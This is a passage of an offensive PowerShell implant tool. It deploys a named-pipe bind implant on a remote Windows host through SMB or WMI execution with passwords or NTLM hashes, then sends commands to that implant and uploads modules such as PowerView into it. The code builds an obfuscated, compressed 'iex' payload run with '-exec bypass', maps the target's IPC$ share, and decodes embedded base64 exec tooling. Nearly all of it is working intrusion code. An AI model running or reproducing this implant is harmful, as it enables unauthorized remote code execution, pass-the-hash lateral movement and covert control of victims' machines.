gICAgICAgICAgICAgICBbSW5dIFVJbnQzMiBkd0ZsYWdzKTsNCiANCiAgICAgICAgICAgIFtGbGFnc10NCiAgICAgICAgICAgIHB1YmxpYyBlbnVtIEFsZ09wc0ZsYWdzIDogdWludA0KICAgICAgICAgICAgeyAgICAgICAgICAgDQogICAgICAgICAgICAgICAgQkNSWVBUX1BST1ZfRElTUEFUQ0ggPSAweDAwMDAwMDAxLA0KICAgICAgICAgICAgICAgIEJDUllQVF9BTEdfSEFORExFX0hNQUNfRkxBRyA9IDB4MDAwMDAwMDgsDQogICAgICAgICAgICAgICAgQkNSWVBUX0hBU0hfUkVVU0FCTEVfRkxBRyA9IDB4MDAwMDAwMjANCiAgICAgICAgICAgIH0NCiANCiAgICAgICAgICAgIC8vIFRoaXMgaXMgYSBnaWdhbnRpYyBlbnVtIGFuZCBJIGRvbid0IHdhbnQgdG8gY29weSBhbGwgb2YgaXQgaW50byB0aGlzIFBvd2Vyc2hlbGwgc2NyaXB0Lg0KICAgICAgICAgICAgLy8gQmFzaWNhbGx5IGFueXRoaW5nIG90aGVyIHRoYW4gemVybyBtZWFucyBzb21ldGhpbmcgd2VudCB3cm9uZy4NCiAgICAgICAgICAgIHB1YmxpYyBlbnVtIE5UU3RhdHVzIDogdWludA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFNUQVRVU19TVUNDRVNTID0gMHgwMDAwMDAwMA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQonQA0KfQ0KIA0KICAgICAgICBbQnl0ZVtdXSRIYXNoQnl0ZXMgICA9IE5ldy1PYmplY3QgQnl0ZVtdIDE2DQogICAgICAgIFtJbnRQdHJdJFBIQWxnb3JpdGhtID0gW0ludFB0cl06Olplcm8NCiAgICAgICAgW0ludFB0cl0kUEhIYXNoICAgICAgPSBbSW50UHRyXTo6WmVybw0KICAgICAgICAkTlRTdGF0dXMgPSBbZHNhZmRzYWZkc2FmZHNdOjpCQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIoW1JlZl0gJFBIQWxnb3JpdGhtLCAnTUQ0JywgJE51bGwsIDApDQogICAgICAgIElmICgkTlRTdGF0dXMgLU5FIDApDQogICAgICAgIHsNCiAgICAgICAgICAgIFdyaXRlLUVycm9yICJCQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIgZmFpbGVkIHdpdGggTlRTVEFUVVMgJE5UU3RhdHVzIg0KICAgICAgICAgICAgSWYgKCRQSEFsZ29yaXRobSAtTkUgW0ludFB0cl06Olplcm8pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0Q2xvc2VBbGdvcml0aG1Qcm92aWRlcigkUEhBbGdvcml0aG0sIDApDQogICAgICAgICAgICB9DQogICAgICAgICAgICBSZXR1cm4NCiAgICAgICAgfQ0KICAgICAgICAkTlRTdGF0dXMgPSBbZHNhZmRzYWZkc2FmZHNdOjpCQ3J5cHRDcmVhdGVIYXNoKCRQSEFsZ29yaXRobSwgW1JlZl0gJFBISGFzaCwgW0ludFB0cl06Olplcm8sIDAsIFtJbnRQdHJdOjpaZXJvLCAwLCAwKQ0KICAgICAgICBJZiAoJE5UU3RhdHVzIC1ORSAwKQ0KICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1FcnJvciAiQkNyeXB0Q3JlYXRlSGFzaCBmYWlsZWQgd2l0aCBOVFNUQVRVUyAkTlRTdGF0dXMiDQogICAgICAgICAgICBJZiAoJFBISGFzaCAtTkUgW0ludFB0cl06Olplcm8pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0RGVzdHJveUhhc2goJFBISGFzaCkgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIElmICgkUEhBbGdvcml0aG0gLU5FIFtJbnRQdHJdOjpaZXJvKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICROVFN0YXR1cyA9IFtkc2FmZHNhZmRzYWZkc106OkJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIoJFBIQWxnb3JpdGhtLCAwKQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgUmV0dXJuDQogICAgICAgIH0NCiANCiAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0SGFzaERhdGEoJFBISGFzaCwgJERhdGFUb0hhc2gsICREYXRhVG9IYXNoLkxlbmd0aCwgMCkNCiAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0RmluaXNoSGFzaCgkUEhIYXNoLCAkSGFzaEJ5dGVzLCAkSGFzaEJ5dGVzLkxlbmd0aCwgMCkNCiANCiAgICAgICAgSWYgKCRQSEhhc2ggLU5FIFtJbnRQdHJdOjpaZXJvKQ0KICAgICAgICB7DQogICAgICAgICAgICAkTlRTdGF0dXMgPSBbZHNhZmRzYWZkc2FmZHNdOjpCQ3J5cHREZXN0cm95SGFzaCgkUEhIYXNoKQ0KICAgICAgICB9DQogICAgICAgIElmICgkUEhBbGdvcml0aG0gLU5FIFtJbnRQdHJdOjpaZXJvKQ0KICAgICAgICB7DQogICAgICAgICAgICAkTlRTdGF0dXMgPSBbZHNhZmRzYWZkc2FmZHNdOjpCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyKCRQSEFsZ29yaXRobSwgMCkNCiAgICAgICAgfQ0KICAgICAgICAgDQogICAgICAgICRIYXNoU3RyaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyDQogICAgICAgIEZvcmVhY2ggKCRCeXRlIEluICRIYXNoQnl0ZXMpDQogICAgICAgIHsNCiAgICAgICAgICAgIFtWb2lkXSRIYXNoU3RyaW5nLkFwcGVuZCgkQnl0ZS5Ub1N0cmluZygiWDIiKSkNCiAgICAgICAgfQ0KICAgICAgICBSZXR1cm4gJEhhc2hTdHJpbmcuVG9TdHJpbmcoKQ0KICAgIH0NCn0NCg=="

    # Convert server scriptblock to base64 with compression
    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($s_scriptblock)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
    $payload = "cmd /c powershell -exec bypass -c `"`"$NewScript`"`""

    if ($hash.ispresent){
        if ($domain -eq ".") {
	        $net = new-object -ComObject WScript.Network
	        $net.MapNetworkDrive("", "\\$target\ipc$", $false, "$target\$user2", "$Password2")
       } else {
	        $net = new-object -ComObject WScript.Network
	        $net.MapNetworkDrive("", "\\$target\ipc$", $false, "$domain2\$user2", "$Password2")
            }
            }
     else {

       if ($domain -eq ".") {
	        $net = new-object -ComObject WScript.Network
	        $net.MapNetworkDrive("", "\\$target\ipc$", $false, "$target\$user", "$Password")
       } else {
	        $net = new-object -ComObject WScript.Network
	        $net.MapNetworkDrive("", "\\$target\ipc$", $false, "$domain\$user", "$Password")
    }
    }

    # if psexec
    if ($PSexec.IsPresent) {
        $smbexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($smbexec))
        IEX $smbexecw
        echo "`n[+] Running Invoke-SMBExec with the supplied credentials"
        if ($hash){
        $smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Hash `"$hash`" -Command `"$payload`""
        } else {
        $smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Password `"$password`" -Command `"$payload`""
        }
        $success = IEX $smbcmd
        $success
    } else {
        $wmiexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wmiexec))
        IEX $wmiexecw
        echo "`n[+] Running Invoke-WMIExec with the supplied credentials"
        if ($password){
        $wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Password `"$password`" -Command `"$payload`""
        } else {
        $wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Hash `"$hash`" -Command `"$payload`""
        }
        $success = IEX $wmicmd
        $success
    }
    
    $PIPE_runspace = [RunspaceFactory]::CreateRunspace()
    $PIPE_runspace.Open()
    $PIPE_runspace.SessionStateProxy.SetVariable('pipestate',$pipestate)
    $PIPE_powershell = [PowerShell]::Create()
    $PIPE_powershell.Runspace = $PIPE_runspace
    $PIPE_powershell.AddScript($c_scriptblock) > $null
    $PIPE_powershell.BeginInvoke() > $null
    echo ""
    $endtime = (Get-Date).AddMilliseconds($timeout)
    while ((Get-Date) -lt $endtime){
    if ($pipestate.state -eq $true)
    { break }

    #echo $pipestate.state
    }

    if ($pipestate.state -eq $True){
        echo "Connected: $target - $pname"
        echo ""
    
        }
    elseif ((get-date) -lt $endtime){
        echo "Not Connected: Timeout occured"
        }
    else {
        echo "Not Connected: :-("
        }
}
}

function Pbind-Command ($command){
<#
    .SYNOPSIS

        Used to interact with the implant and send basic commands. 

    .EXAMPLE

        PS C:\> Pbind-Command ipconfig

    .DESCRIPTION
    
        Runs ipconfig on the target endpoint and returns the output. See pbind scripts to execute more advanced powershell.
#>
    if ($pipestate.state -eq $true){
	$script:pipestate.log = $null
        echo ""
        echo "[+] Sending command: $command"
        echo "" 
        $script:pipestate.command = $command
        while ($pipestate.log -eq $null){}
        $output = $pipestate.log -replace '123456(.+?)654321', ''
        $output 
        }
    else {
        echo "Not Connected: Command Not Sent"
    }
}

function Pbind-module ($command){
<#
    .SYNOPSIS

        Used to upload modules to the implant. 

    .EXAMPLE

        PS C:\> Pbind-module "c:\modules folder\powerview.ps1"

    .DESCRIPTION 
    
        Reads in a ps1 file into the implant, will execute if auto run configured. 
        Use pbind-module to run functions loaded in memory (this is all done local to where the implant is run and does not work well with a C2 - see command scripts for better use case in a C2.
#>
    if ($pipestate.state -eq $true){
        $pipestate.log = $null
        echo ""
        echo "[+] Loading Module $command"
        echo "" 
        $mod = "$command"
        #echo "collecting module $command"
        $content = [IO.File]::ReadAllText($mod)
        $script:pipestate.command = $content
        while ($pipestate.log -eq $null){}
        $output = $pipestate.log -replace '123456(.+?)654321', ''
        $output}
    else {
        echo "Not Connected: Command Not Sent"
    }

}

function Pbind-Kill ($command){
<#
    .SYNOPSIS

        Used to kill the implant on the target. 

    .EXAMPLE

        PS C:\> Pbind-Kill

    .DESCRIPTION 
    
        Destroys Pipe on target
#>
    if ($pipestate.state -eq $true){
        echo ""
        "[-] Killing pipe"
        $script:pipestate.state = $false
        $script:pipestate.command = "KILLPIPE"
        echo "" 
        }
    else {
        echo "Not Connected: Command Not Send"
    }
}

function Pbind-squirt ($command){
<#
    .SYNOPSIS

        Used to squirt modules into memory, only works with pre-configured modules such as powerup (already bundled) 

    .EXAMPLE

        PS C:\> Pbind-squirt powerup

    .DESCRIPTION 
    
        Loads base64'd modules into the implant, will execute if auto run configured. Use pbind-command to run functions loaded in memory.
#>

$powerup = ""

    if ($pipestate.state -eq $true){
        $pipestate.log = $null
        echo ""
        echo "[+] Squirting Module"
        echo ""
        if ($command -eq "powerup"){
        $smodbase = $powerup}
        $smod = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($smodbase))
        $script:pipestate.command = "squirtmodule $smod"
        #echo $pipestate.command
        while ($pipestate.log -eq $null){}
        $output = $pipestate.log -replace '123456(.+?)654321', ''
        $output}
    else {
        echo "Not Connected: Command Not Sent"
    }
}





